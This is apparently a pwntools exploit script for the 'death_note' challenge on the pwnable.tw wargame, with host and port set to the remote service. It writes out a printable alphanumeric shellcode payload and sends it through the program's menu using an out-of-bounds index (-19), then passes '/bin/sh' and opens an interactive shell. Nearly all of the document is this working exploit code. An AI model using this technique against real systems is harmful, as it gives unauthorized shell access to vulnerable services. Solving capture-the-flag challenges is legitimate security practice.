#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('death_note')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10201)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x08048490
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
if args.GDB:
    io.recvline()

# interesting tehnique
payload = "[[SYAAAAAAAAAAAAAAAARXH0A+@@0A,HH0A,@4A4JRY2~B"

_sndla(':', "1")
_sndla(':', "0")
_sndla(':', "/bin/sh\x00")
_sndla(':', "1")
_sndla(':', "-19")
_sndla(':', payload)
_sndla(':', "3")
_sndla(':', "0")

io.interactive()

